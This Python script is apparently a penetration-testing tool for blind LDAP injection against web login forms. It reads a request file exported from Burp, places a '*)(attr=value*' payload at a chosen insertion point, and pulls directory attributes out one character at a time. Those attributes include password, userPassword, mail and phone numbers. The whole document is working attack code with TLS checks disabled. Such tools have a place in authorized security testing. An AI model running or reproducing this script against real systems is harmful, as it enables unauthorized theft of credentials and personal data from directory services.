#!/usr/bin/env python3
import requests
import string
from time import sleep
import sys
import base64
import Burpee.burpee
import logging
import traceback
import argparse
from urllib.parse import urlparse, urlunparse
from urllib.parse import parse_qs
import json
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
  """ 
  url_str: string 
  header_json: json
  data_json: json
  """

  alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
  attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

  for attribute in attributes: #Extract all attributes
    value = ""
    finish = False
    while not finish:
      for char in alphabet: #In each possition test each possible printable char
        query = "*)({}={}{}*".format(attribute, value, char)

        # if base64 encoded:
        if args.encode:
          query = base64.b64encode(query.encode("utf-8")).decode("utf-8")
        logging.debug("payload: {}".format(query))

        data_str = json.dumps(data_json).replace(args.insertionTag, query)
        data_json_t = json.loads(data_str)

        header_str = json.dumps(header_json).replace(args.insertionTag, query)
        header_json_t = json.loads(header_str)

        if method == "POST":
          if form == "json":
            r = requests.post(url_str, headers=header_json_t, json=data_json_t, proxies=proxy, verify=False)
          else:
            r = requests.post(url_str, headers=header_json_t, data=data_json_t, proxies=proxy, verify=False)
        elif method == "GET":
          r = requests.get(url_str, headers=header_json_t, params=data_json_t, proxies=proxy, verify=False)
        else:
          print("[-] Error: method {} not implemented. Try with GET or POST.".format(method))
          exit(-1)

        sys.stdout.write(f"\r{attribute}: {value}{char}")

        #sleep(0.5) #Avoid brute-force bans

        if "Cannot login" in r.text and not ("not valid" in r.text or "Malformed" in r.text):
          value += str(char)
          break

        if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
          finish = True
          print()



def extractKeyword(string):
  keyword = ""
  tags = ["[l,L]ogin", "[u,U]sername", "[u,U]ser"]
  #string = string.replace("'", "\"")
  keyword = ""
  for t in tags:
    try:
      #print("    Searching string {} for keyword {}".format(string, t))
      keyword = re.search("([^\",^']*" + t + "[^\",^']*)", string).group(1)
      #print("    -> {}".format(keyword))
      if keyword != "":
        user = input("[+] Keyword {} found. Continue with this insertion point? [Y/n]: ".format(keyword))
        if user == 'Y' or user == 'y' or user == '':
          break
        else:
          keyword = ""

    except:
      keyword = ""

    logging.debug("Keyword {}".format(keyword))
  
  return keyword



def calculateInsertionPoint(args, url_json, header_json, data_json):
  """ 
  All arguments in json format
  """

  print("[*] Calculating insertion point.")
  data_str = json.dumps(data_json)
  header_str = json.dumps(header_json)
  url_str = json.dumps(url_json)
  if args.insertionTag not in url_str and args.insertionTag not in data_str and args.insertionTag not in header_str:
    print("[*] Insertion tag '*' not found in request. Searching for keywords 'login', 'username' and 'user'.")
   
    print("[*] Searching header for insertion points.") 
    key = extractKeyword(header_str)
    if key != "":
      print("[*] Inserting insertion point into header {}".format(key))
      header_json[key] = '*'
    else:
      print("[*] Searching post data for insertion points.")
      key = extractKeyword(data_str) 
      if key != "":
        print("[*] Inserting insertion point into data parameter {}".format(key))
        data_json[key] = '*'
      else:
        print("[*] Searching url for insertion points.")
        key = extractKeyword(url_str) 
        if key != "":
          print("[*] Inserting insertion point into url parameter {}".format(key))
          url_json[key] = '*'
        else:
          print("[*] No insertion points inserted.")
          print("[*] Aborting.")
          exit(0)

  return (url_json, header_json, data_json)



def main():
  # TODO: Splash screen

  # TODO: add method parameter
  parser = argparse.ArgumentParser(description="Test a login page for LDAP injection.")
  parser.add_argument('-r', '--req', dest='requestFile', type=str, required=True, help="Request file. For example copied from Burp.")  
  parser.add_argument('-t', '--tag', dest="insertionTag", type=str, default='*', help="Insertion point. Default *. Marks the spot for LDAP insertion.")
  parser.add_argument('--protocol', dest='protocol', type=str, default='https', help="The protocol to user: https or http. Default https.")
  parser.add_argument('--proxy', dest='proxy', type=str, default='', help="Use a proxy to connect to the target URL. Example: --proxy 127.0.0.1:8080")
  parser.add_argument('--encode', dest='encode', action='store_true', help="Base64-encode the payload.")
  parser.add_argument('--module', dest='module', type=str, default='enum', help="The module to use: login (TODO), enum, dump (TODO)")
  parser.add_argument('--loglevel', dest='loglevel', default='WARNING', help="DEBUG, INFO, WARNING, ERROR")
  args = parser.parse_args()

  logging.basicConfig(level=getattr(logging, args.loglevel))

  print("[*] Parsing Burp request file.")
  header_json, data = Burpee.burpee.parse_request(args.requestFile)
  print("[*] Done.")
  
  # logic if data is not in json format
  try:
    form = "json"
    data_json = json.loads(data)
  except:
    data_t = "placeholder.com/path?" + data
    form = "plain"
    data_json = parse_qs(urlparse(data_t).query)

  # extract get parameters (if any) from url
  method, resource_name = Burpee.burpee.get_method_and_resource(args.requestFile)
  url_parsed = urlparse(resource_name)
  url_str = args.protocol + "://" + header_json["Host"] + url_parsed.path
  url_json = parse_qs(url_parsed.query)

  # logging
  logging.info("Extracted headers: {}".format(header_json))
  logging.info("Extracted post data: {}".format(data_json))
  logging.info("Extracted url parameter: {}".format(url_json))

  # calculate the ldap injection insertion point
  url_json, header_json, data_json = calculateInsertionPoint(args, url_json, header_json, data_json)
  if method == "GET":
    data_json = url_json

  # set up the proxy
  if args.proxy != '':
    proxy = { "http" : "http://" + args.proxy, "https" : "http://" + args.proxy }
  else:
    proxy = {}
  logging.debug("Using proxy {}".format(proxy))

  # choose module
  if args.module == 'enum':
    enum(args, url_str, header_json, data_json, proxy, method, form)


if __name__ == '__main__':
  try:
    main()
  except (KeyboardInterrupt):
    logging.info('Exiting.')
  except Exception as e:
    logging.error("Exiting {}".format(e))
    logging.debug(traceback.format_exc())

